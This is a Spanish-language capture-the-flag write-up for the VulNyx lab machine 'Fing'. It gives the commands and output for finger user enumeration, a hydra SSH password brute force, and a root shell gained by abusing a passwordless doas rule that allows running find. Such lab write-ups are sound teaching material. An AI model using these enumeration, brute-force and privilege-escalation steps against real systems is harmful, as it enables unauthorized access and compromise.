# WriteUp: Fing | VulNyx

Iniciamos un escaneo con nmap para identificar los puertos abierto:

```sh
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.27

PORT   STATE SERVICE
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
```

Realizamos otro escaneo para identificar mayor información en los puertos encontrados:

```sh
nmap -sVC -p22,79,80 192.168.56.27               

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

Ahora lo siguiente que hice fue visitar la página web en el puerto 80, sin embargo no encontré nada relevante:

<figure><img src="../../.gitbook/assets/Pasted image 20250930010543.png" alt=""><figcaption></figcaption></figure>

El servicio que corre por el puerto 79 lo desconocía completamente, así que decidí pedirle a Gemini que me de información a cerca de este servicio que correo en el puerto 79:

`finger` es un protocolo/servicio muy antiguo para consultar información sobre usuarios de un sistema remoto. Si está habilitado, puede devolver:

* nombre completo del usuario
* último inicio de sesión (last login)
* shell y home directory
* contenido de archivos de usuario especiales (`.plan`, `.project`, `.forward`) si están presentes
* a veces dirección de correo, teléfono u otros datos que el usuario puso en su registro

```sh
# Pedir información de varios usuarios populares
for u in root admin user test guest tom jerry alice bob; do
  echo "== $u =="; finger $u@192.168.56.27;
done

```

Una vez realizado ello, obtuve la siguiente respuesta:

```sh
== root ==
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Last login Fri Jul 14 17:02 2023 (CEST) on tty1
No mail.
No Plan.
== admin ==
finger: admin: no such user.
== user ==
finger: user: no such user.
== test ==
finger: test: no such user.
== guest ==
finger: guest: no such user.
== tom ==
finger: tom: no such user.
== jerry ==
finger: jerry: no such user.
== alice ==
finger: alice: no such user.
== bob ==
finger: bob: no such user.
```

Como podemos ver, el usuario root existe, sin embargo sería una pérdida tiempo intentar descifrar a través de fuerza bruta la contraseña, debido a que este usuario tiene medidas de seguridad implementadas para la conexión SSH, por lo que decidí buscar hacer fuerza bruta con los usuarios y así tratar de encontrar alguno que nos sirva.

Decidí utilizar la Seclists para probar los posibles usuarios:

```sh
HOST=192.168.56.27
WORDLIST=/usr/share/seclists/Usernames/Names/names.txt

while read -r user; do
  printf "\n== %s ==\n" "$user"
  finger "${user}"@"${HOST}"
done < "$WORDLIST" > resultados_finger.txt
```

Luego de un buen rato de espera, leí el archivo de salida con un editor de texto y busqué "login" encontrando lo siguiente:

```
== adam ==
Login: adam           			Name: adam
Directory: /home/adam               	Shell: /bin/bash
Last login Sun Apr 23 13:21 2023 (CEST) on pts/0 from 192.168.1.10
No mail.
No Plan.
```

Ahora sí decidí hacer fuerza bruta al SSH:

```sh
hydra -l adam -P /usr/share/wordlists/rockyou.txt 192.168.56.27 ssh -s 22 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-29 20:53:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.27:22/
[STATUS] 211.00 tries/min, 211 tries in 00:01h, 14344192 to do in 1133:02h, 12 active
[STATUS] 180.00 tries/min, 540 tries in 00:03h, 14343864 to do in 1328:09h, 11 active
[22][ssh] host: 192.168.56.27   login: adam   password: XXXXXXXXXX

# 7u7!!! BINGO!! Tenemos acceso
```

Ahora nos conectamos a través de SSH:

```sh
ssh adam@192.168.56.27                 
The authenticity of host '192.168.56.27 (192.168.56.27)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.27' (ED25519) to the list of known hosts.
adam@192.168.56.27's password: 
Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10

adam@fing:~$ id
uid=1000(adam) gid=1000(adam) grupos=1000(adam)
```

Una vez realizado esto empiezo a buscar permisos de ejecución:

```sh
sudo -l
# NADA

find / -perm -u=s -type f 2>/dev/null

# RESULTADO
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/doas
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

De esta lista la que más me llama la atención es `/usr/bin/doas`, nunca lo había visto. Busco información al respecto y obtengo la siguiente información: "es un sustituto de `sudo`. Si está mal configurado (`/etc/doas.conf`) puede permitir ejecutar comandos como root sin contraseña."

Lo siguiente que hice fue ejecutar el comando:

```sh
adam@fing:/$ /usr/bin/doas
usage: doas [-Lns] [-C config] [-u user] command [args]
```

La opción `-u user` me da el indicio de que puedo colocar el usuario root, pero para ello tendría que tener los permisos, así que decidí revisar `/etc/doas.conf` para verificar si es que hay indicios de una mala configuración:

```sh
adam@fing:/$ cat /etc/doas.conf
permit nopass keepenv adam as root cmd /usr/bin/find

# Y sí, cómo podemos ver, se me permite ejecutar find como root sin la necesidad de una contraseña
```

`find` cuenta con la opción `-exec` que permite ejecutar otros comandos como el mismo usuario que ejecuta `find`. Como `doas` lanza `find` como root, puedo usar `-exec` para ejecutar una shell o copiar `bash` y convertirla en SUID root.

Para tal caso, utilicé el siguiente comando:

```sh
adam@fing:/$ doas /usr/bin/find / -exec /bin/sh -i \;

# id
uid=0(root) gid=0(root) grupos=0(root)
# ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt  
```

7u7!!! Listo, completamos la máquina 7u7!!!!!
